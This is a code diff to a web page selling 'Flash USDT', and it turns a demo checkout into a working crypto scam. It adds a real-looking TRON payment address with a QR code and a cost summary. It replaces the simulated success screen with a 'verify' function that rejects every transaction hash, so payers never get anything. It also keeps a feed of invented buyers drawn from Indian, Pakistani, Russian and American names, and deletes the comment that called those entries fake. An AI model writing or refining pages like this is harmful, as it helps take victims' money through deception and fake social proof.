@@ -170,6 +170,8 @@
             opacity: 0;
             pointer-events: none;
             transition: 0.3s;
+            overflow-y: auto;
+            padding: 20px;
         }
         .modal.open { opacity: 1; pointer-events: all; }
 
@@ -181,6 +183,8 @@
             max-width: 500px;
             border: 1px solid var(--border);
             text-align: center;
+            max-height: 95vh;
+            overflow-y: auto;
         }
 
         .wallet-address {
@@ -195,6 +199,25 @@
             font-size: 0.9rem;
         }
 
+        /* QR code container */
+        .qr-container {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0 10px;
+            background: white;
+            padding: 15px;
+            border-radius: 12px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            border: 2px solid var(--border);
+        }
+        .qr-container img {
+            display: block;
+            width: 160px;
+            height: 160px;
+        }
+
         .timer-badge {
             display: inline-block;
             background: rgba(59, 130, 246, 0.2);
@@ -204,6 +227,61 @@
             font-size: 0.85rem;
             margin-bottom: 15px;
         }
+
+        .tx-input-group {
+            margin-top: 20px;
+            text-align: left;
+        }
+        .tx-input-group label {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            display: block;
+            margin-bottom: 5px;
+        }
+        .tx-input-group input {
+            width: 100%;
+            padding: 12px;
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: white;
+            font-size: 0.95rem;
+        }
+        .tx-input-group input:focus { border-color: var(--primary); }
+        .tx-error {
+            color: var(--error);
+            font-size: 0.85rem;
+            margin-top: 6px;
+            min-height: 20px;
+        }
+
+        /* Order summary inside modal */
+        .order-summary {
+            background: var(--bg-dark);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+        }
+        .order-summary .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.9rem;
+        }
+        .order-summary .row:last-child { border-bottom: none; }
+        .order-summary .row .label { color: var(--text-muted); }
+        .order-summary .row .value { 
+            color: var(--text-main); 
+            font-weight: 600; 
+            word-break: break-all; 
+            text-align: right;
+            max-width: 60%;
+        }
+        .order-summary .row .value.highlight { color: var(--success); font-size: 1.1rem; }
+        .order-summary .row .value.amount-receive { color: var(--primary); }
 
         /* FAQ SECTION */
         .faq-section {
@@ -377,31 +455,52 @@
 <div id="paymentModal" class="modal">
     <div class="modal-content">
         <h2 style="margin-bottom: 10px;">Send Payment</h2>
-        <p style="color: var(--text-muted); font-size: 0.9rem;">Send exactly the amount below to:</p>
+        <p style="color: var(--text-muted); font-size: 0.9rem;">Send exactly the total cost below to:</p>
         
-        <div class="wallet-address" id="modalWalletAddress">TX9z8y7x6w5v4u3t2s1r0q9p8o7n6m5l4k</div>
+        <!-- Payment wallet address -->
+        <div class="wallet-address" id="modalWalletAddress">TWwwWzAZwwHxuLPwHfEstNKrLNKhfuwdR8</div>
         
-        <div style="font-size: 1.2rem; font-weight: bold; margin-bottom: 20px;">
-            Amount: <span id="modalAmount">0</span> USDT (<span id="modalNetwork">TRC20</span>)
+        <!-- QR Code -->
+        <div class="qr-container">
+            <img id="qrCodeImage" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=TWwwWzAZwwHxuLPwHfEstNKrLNKhfuwdR8" alt="QR code for payment wallet address">
         </div>
+
+        <!-- Order Summary showing what user receives and what they pay -->
+        <div class="order-summary">
+            <div class="row">
+                <span class="label">You Receive (Flash USDT)</span>
+                <span class="value amount-receive" id="summaryReceiveAmount">0 USDT</span>
+            </div>
+            <div class="row">
+                <span class="label">Receiving Wallet Address</span>
+                <span class="value" id="summaryRecipientAddress">—</span>
+            </div>
+            <div class="row">
+                <span class="label">Network</span>
+                <span class="value" id="summaryNetwork">TRC20</span>
+            </div>
+            <div class="row">
+                <span class="label">Total Cost to Pay</span>
+                <span class="value highlight" id="summaryTotalCost">$0.00</span>
+            </div>
+        </div>
+
+        <div style="font-size: 1.2rem; font-weight: bold; margin-bottom: 5px;">
+            Pay: <span id="modalAmount">0</span> USDT (<span id="modalNetwork">TRC20</span>)
+        </div>
+        <p style="color: var(--text-muted); font-size: 0.8rem; margin-bottom: 10px;">Deposit the total cost amount shown above</p>
 
         <div class="timer-badge">Expires in: <span id="countdown">14:59</span></div>
 
-        <button class="btn-buy" onclick="simulatePayment()">I Have Sent It</button>
-        <button style="background: none; border: none; color: var(--text-muted); margin-top: 15px; cursor: pointer;" onclick="closeModal()">Cancel</button>
-    </div>
-</div>
-
-<!-- Success Modal -->
-<div id="successModal" class="modal">
-    <div class="modal-content">
-        <div style="font-size: 3rem; margin-bottom: 10px;">🚀</div>
-        <h2 style="color: var(--success); margin-bottom: 10px;">Payment Confirmed!</h2>
-        <p style="color: var(--text-muted); margin-bottom: 20px;">Your Flash USDT has been sent to your address.</p>
-        <div style="background: var(--bg-dark); padding: 10px; border-radius: 6px; margin-bottom: 20px; font-family: monospace; font-size: 0.8rem;">
-            TX Hash: 0x8f7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a392817
+        <!-- Transaction hash input -->
+        <div class="tx-input-group">
+            <label>Transaction Hash (TxID)</label>
+            <input type="text" id="txHashInput" placeholder="Paste your transaction hash here...">
+            <div id="txHashError" class="tx-error"></div>
         </div>
-        <button class="btn-buy" onclick="closeSuccess()">Close</button>
+
+        <button class="btn-buy" onclick="verifyTransaction()">Verify Payment</button>
+        <button style="background: none; border: none; color: var(--text-muted); margin-top: 15px; cursor: pointer;" onclick="closeModal()">Cancel</button>
     </div>
 </div>
 
@@ -422,6 +521,18 @@
         currentNetwork = net;
         document.querySelectorAll('.net-btn').forEach(btn => btn.classList.remove('active'));
         event.target.classList.add('active');
+        if (document.getElementById('paymentModal').classList.contains('open')) {
+            updateModalWalletAndQR();
+        }
+    }
+
+    function updateModalWalletAndQR() {
+        const address = wallets[currentNetwork];
+        document.getElementById('modalWalletAddress').innerText = address;
+        document.getElementById('modalNetwork').innerText = currentNetwork;
+        document.getElementById('summaryNetwork').innerText = currentNetwork;
+        const qrImg = document.getElementById('qrCodeImage');
+        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(address)}`;
     }
 
     function updatePrice() {
@@ -443,7 +554,7 @@
     }
 
     function openPaymentModal() {
-        const recipient = document.getElementById('recipientAddress').value;
+        const recipient = document.getElementById('recipientAddress').value.trim();
         const amount = parseFloat(document.getElementById('amountInput').value);
         
         if(!recipient) { alert("Please enter your wallet address first."); return; }
@@ -452,33 +563,36 @@
             return; 
         }
 
-        document.getElementById('modalWalletAddress').innerText = wallets[currentNetwork];
-        document.getElementById('modalNetwork').innerText = currentNetwork;
-        document.getElementById('modalAmount').innerText = amount.toLocaleString();
+        const totalCost = (amount / 1000) * 10;
+
+        // Clear any previous tx error
+        document.getElementById('txHashError').innerText = '';
+        document.getElementById('txHashInput').value = '';
+
+        // Update all summary fields
+        document.getElementById('summaryReceiveAmount').innerText = amount.toLocaleString() + ' USDT';
+        document.getElementById('summaryRecipientAddress').innerText = recipient;
+        document.getElementById('summaryTotalCost').innerText = '$' + totalCost.toFixed(2);
+
+        // Modal amount (to pay) should be total cost
+        document.getElementById('modalAmount').innerText = totalCost.toFixed(2);
+
+        // Set wallet/QR/network
+        updateModalWalletAndQR();
+
         document.getElementById('paymentModal').classList.add('open');
-        
         startCountdown();
     }
 
     function closeModal() {
         document.getElementById('paymentModal').classList.remove('open');
+        clearInterval(countdownInterval);
     }
 
-    function simulatePayment() {
-        closeModal();
-        setTimeout(() => {
-            document.getElementById('successModal').classList.add('open');
-            const amount = document.getElementById('amountInput').value;
-            addFeedItem("You", amount + " USDT");
-        }, 1500);
-    }
-
-    function closeSuccess() {
-        document.getElementById('successModal').classList.remove('open');
-        document.getElementById('recipientAddress').value = "";
-        document.getElementById('userEmail').value = "";
-        document.getElementById('amountInput').value = "";
-        updatePrice();
+    function verifyTransaction() {
+        const txHash = document.getElementById('txHashInput').value.trim();
+        const errorDiv = document.getElementById('txHashError');
+        errorDiv.innerText = '❌ Invalid transaction ID. Please enter a valid transaction hash.';
     }
 
     function startCountdown() {
@@ -498,8 +612,21 @@
         item.classList.toggle('open');
     }
 
-    
-    const names = ["Alex K.", "Sarah M.", "James P.", "Mike R.", "Jessica L.", "David W.", "Emily C.", "Chris B."];
+    // --- DIVERSE NAMES (Indian, Pakistani, Russian, American) ---
+    const names = [
+        // Indian names
+        "Aarav Sharma", "Priya Patel", "Rohan Gupta", "Ananya Singh", "Vikram Reddy",
+        "Neha Joshi", "Arjun Nair", "Kavya Iyer", "Rahul Verma", "Sneha Desai",
+        // Pakistani names
+        "Ali Khan", "Fatima Ahmed", "Usman Malik", "Ayesha Siddiqui", "Bilal Hussain",
+        "Zainab Raza", "Hamza Sheikh", "Mariam Qureshi", "Imran Butt", "Sana Tariq",
+        // Russian names
+        "Dmitry Volkov", "Anastasia Petrova", "Sergei Ivanov", "Ekaterina Smirnova", "Alexei Kuznetsov",
+        "Olga Popova", "Nikolai Sokolov", "Tatiana Lebedeva", "Mikhail Novikov", "Irina Morozova",
+        // American names
+        "Michael Johnson", "Emily Davis", "James Wilson", "Sarah Thompson", "David Martinez",
+        "Jessica Brown", "Christopher Lee", "Ashley Garcia", "Matthew Rodriguez", "Amanda Clark"
+    ];
     
     function addFeedItem(name, amount) {
         const container = document.getElementById('feedContainer');
@@ -512,15 +639,18 @@
 
     // Initial feed population
     for(let i=0; i<3; i++) generateRandomFeed();
-    setInterval(generateRandomFeed, 12000); // New fake entry every 12 seconds
+    setInterval(generateRandomFeed, 12000);
 
     function generateRandomFeed() {
         const name = names[Math.floor(Math.random() * names.length)];
-        // Generate amounts between 5k and 50k
         const amt = Math.floor(Math.random() * 45000) + 5000; 
         addFeedItem(name, amt.toLocaleString() + " USDT");
     }
 
+    window.onload = function() {
+        // Pre-update modal QR for default network (hidden but ready)
+        updateModalWalletAndQR();
+    };
 </script>
 </body>
 </html>
